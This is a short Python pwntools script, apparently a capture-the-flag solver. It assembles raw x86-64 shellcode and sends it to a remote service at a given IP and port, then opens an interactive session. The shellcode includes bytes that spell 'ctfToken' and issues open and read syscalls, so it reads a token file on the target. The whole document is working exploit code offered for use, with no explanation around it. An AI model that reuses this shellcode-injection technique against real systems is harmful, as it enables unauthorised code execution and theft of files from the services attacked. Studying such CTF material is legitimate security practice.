from pwn import *
import sys

def make_shellcode():
    code = "\x55\x48\x89\xe5\x48\xc7\x45\xc0\x00\x00\x00\x00\x48\xc7\x45\xc8\x00\x00\x00\x00\xc7\x45\xd0\x00\x00\x00\x00\xc6\x45\xc0\x07\xe9\x6a\x01\x00\x00\x48\xc7\x45\xf8\x11\x00\x00\x00\x48\xc7\x45\xd8\xc2\xa9\x79\x24\x48\x8b\x45\xd8\x48\x89\x45\xf8\xc7\x45\xf4\x00\x00\x00\x00\x83\x7d\xf4\x09\x0f\x8f\x1c\x01\x00\x00\xc7\x45\xf0\x00\x00\x00\x00\x83\x7d\xf0\x10\x7f\x3a\x8b\x45\xf0\x48\x98\x0f\xb6\x44\x05\xc0\x88\x45\xd7\x48\x8b\x45\xf8\x48\xc1\xe0\x07\x48\x89\xc2\x48\x8b\x45\xf8\x48\x01\xc2\x48\x0f\xbe\x45\xd7\x48\x01\xd0\xba\x00\x00\x00\x00\x48\xf7\x75\xd8\x48\x89\x55\xf8\x83\x45\xf0\x01\xeb\xc0\xc7\x45\xec\x00\x00\x00\x00\x83\x7d\xec\x10\x7f\x36\x8b\x45\xec\x48\x98\x0f\xb6\x44\x05\xc0\x88\x45\xd7\x48\x8b\x45\xf8\x48\xc1\xe0\x07\x48\x89\xc2\x48\x8b\x45\xf8\x48\xc1\xe8\x03\x48\x31\xd0\xba\x00\x00\x00\x00\x48\xf7\x75\xd8\x48\x89\x55\xf8\x83\x45\xec\x01\xeb\xc4\xc7\x45\xe8\x00\x00\x00\x00\x83\x7d\xe8\x10\x7f\x35\x8b\x45\xe8\x48\x98\x0f\xb6\x44\x05\xc0\x88\x45\xd7\x0f\xbe\x55\xd7\x89\xd0\xc1\xe0\x03\x29\xd0\x48\x63\xd0\x48\x8b\x45\xf8\x48\x01\xd0\xba\x00\x00\x00\x00\x48\xf7\x75\xd8\x48\x89\x55\xf8\x83\x45\xe8\x01\xeb\xc5\xc7\x45\xe4\x00\x00\x00\x00\x83\x7d\xe4\x10\x7f\x3a\x8b\x45\xe4\x48\x98\x0f\xb6\x44\x05\xc0\x88\x45\xd7\x48\x8b\x45\xf8\x48\xc1\xe0\x07\x48\x89\xc2\x48\x8b\x45\xf8\x48\x01\xc2\x48\x0f\xbe\x45\xd7\x48\x01\xd0\xba\x00\x00\x00\x00\x48\xf7\x75\xd8\x48\x89\x55\xf8\x83\x45\xe4\x01\xeb\xc0\x83\x45\xf4\x01\xe9\xda\xfe\xff\xff\x48\x8b\x7d\xf8\x48\xc7\xc6\x02\x00\x00\x00\x48\xc7\xc2\x03\x00\x00\x00\x48\xc7\xc0"
    code += "\x6a"  + "\xf4" + "\x40" + "\x00"
    code += "\xff\xd0\xb8\x01\x00\x00\x00\x5d\xc3\x0f\x18\x20\x48\xb8\x63\x74\x66\x54\x6f\x6b\x65\x6e\x48\x89\x45\xc0\x48\x8d\x7d\xc0\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x48\x8d\x75\xc0\x48\x89\xc7\x48\x31\xd2\x66\xba\x11\x00\x48\x31\xc0\x0f\x05\xe9\x62\xfe\xff\xff"
    #print ("%02d",code)
    return code

def send_shellcode(shellcode, ip, port):
    r = remote(ip, port)
    print r.recvuntil("> ")
    r.send(shellcode)
    r.interactive()

def checkInput():
    if len(sys.argv) != 3:
        print "Usage : python solv.py [ip] [port]"
        sys.exit()

if __name__ == "__main__":
    checkInput()
    sc = make_shellcode()
    send_shellcode(sc, sys.argv[1], sys.argv[2])
